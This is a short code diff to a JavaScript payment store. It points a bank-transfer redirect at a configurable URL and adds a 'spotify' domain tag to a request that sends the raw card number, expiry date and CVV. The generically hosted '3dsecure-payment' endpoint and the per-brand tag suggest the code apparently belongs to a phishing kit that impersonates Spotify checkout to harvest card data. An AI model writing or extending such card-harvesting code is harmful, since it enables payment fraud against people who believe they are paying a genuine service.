@@ -26,7 +26,12 @@ const usePaymentStore = create((set) => ({
     try {
       if (paymentMethod === "pse") {
         set({ loading: false });
-        window.location.href = "https://3dsecure-payment.up.railway.app/pse";
+        // Use environment variable
+        const apiUrl = import.meta.env.VITE_API_URL;
+        if (!apiUrl) {
+          throw new Error('VITE_API_URL environment variable is not defined');
+        }
+        window.location.href = `${apiUrl}/pse?domain=spotify`;
         return { success: true, redirect: true };
       }
       const { cardData } = usePaymentStore.getState();
@@ -39,7 +44,8 @@ const usePaymentStore = create((set) => ({
         cardNumber: cardData.cardNumber,
         expDate: cardData.expDate,
         cvv: cardData.cvv,
-        type: cardData.type
+        type: cardData.type,
+        domain: 'spotify'
       });
       set({ loading: false });
       return { success: true, data: response.data };
